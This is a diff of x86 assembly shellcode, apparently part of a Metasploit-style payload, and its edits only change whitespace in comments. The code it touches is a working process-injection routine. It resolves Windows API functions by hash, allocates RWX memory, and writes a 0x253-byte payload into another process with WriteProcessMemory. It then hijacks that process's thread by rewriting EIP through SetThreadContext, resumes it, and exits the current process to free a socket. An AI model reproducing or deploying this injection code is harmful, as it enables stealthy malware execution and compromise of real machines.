@@ -112,9 +112,9 @@ start:                   ;
   push 0xB16B4AB1           ; hash( "kernel32.dll", "GetStartupInfoA" )
   call ebp                  ; GetStartupInfoA( &si );
   lea eax,[esp+0x60]        ; Put startupinfo pointer back in eax
-  mov [eax+0x4], ecx	    	; Clean lpReserved (change me)
-  mov [eax+0x8], ecx	    	; Clean lpDesktop (change me)
-  mov [eax+0xC], ecx		    ; Clean lpTitle (change me)
+  mov [eax+0x4], ecx        ; Clean lpReserved (change me)
+  mov [eax+0x8], ecx        ; Clean lpDesktop (change me)
+  mov [eax+0xC], ecx        ; Clean lpTitle (change me)
   lea edi,[eax+0x60]        ; Offset of empty space for lpProcessInformation
   push edi                  ; lpProcessInformation : write processinfo here
   push eax                  ; lpStartupInfo : current info (read)
@@ -135,7 +135,7 @@ start:                   ;
   push 0x40                 ; RWX
   add bh, 0x10              ; ebx = 0x1000
   push ebx                  ; MEM_COMMIT
-  mov ebx, 0x253   		      ; Bufer size
+  mov ebx, 0x253            ; Bufer size
   push ebx                  
   xor ebx,ebx
   push ebx                  ; address
@@ -145,29 +145,29 @@ start:                   ;
   ; eax now contains the destination
 
   push esp                  ; lpNumberOfBytesWritten
-  push 0x253        		    ; nSize                                  
+  push 0x253                ; nSize                                  
   ; pick up pointer to shellcode & keep it on stack
   jmp begin_of_payload
   begin_of_payload_return:  ; lpBuffer
   push eax                  ; lpBaseAddress
-  XCHG eax, esi				      ; record base address
+  XCHG eax, esi             ; record base address
   push dword [edi]          ; hProcess
   push 0xE7BDD8C5           ; hash( "kernel32.dll", "WriteProcessMemory" )
   call ebp                  ; WriteProcessMemory( ...)
   ; Let's Thread Hijack
   mov ebx, dword [edi+0x4]
   push 0x10001
-  push esp					        ; lpContext
-  push ebx        		    	; hThread
+  push esp                  ; lpContext
+  push ebx                  ; hThread
   push 0xD1425C18           ; hash( "kernel32.dll", "GetThreadContext" ) 
   call ebp                  ; GetThreadContext( ...);
   mov dword [esp+0xB8], esi ; Change EIP Context 
-  push esp					        ; lpContext
-  push ebx					        ; hThread
-  push 0xD14E5C18		      	; hash( "kernel32.dll", "SetThreadContext" ) 
+  push esp                  ; lpContext
+  push ebx                  ; hThread
+  push 0xD14E5C18           ; hash( "kernel32.dll", "SetThreadContext" ) 
   call ebp
-  push ebx					        ; hThread
-  push 0x8EF4092B			      ; hash( "kernel32.dll", "ResumeThread" ) 
+  push ebx                  ; hThread
+  push 0x8EF4092B           ; hash( "kernel32.dll", "ResumeThread" ) 
   call ebp
   ; End the current process to release socket
   push 0					
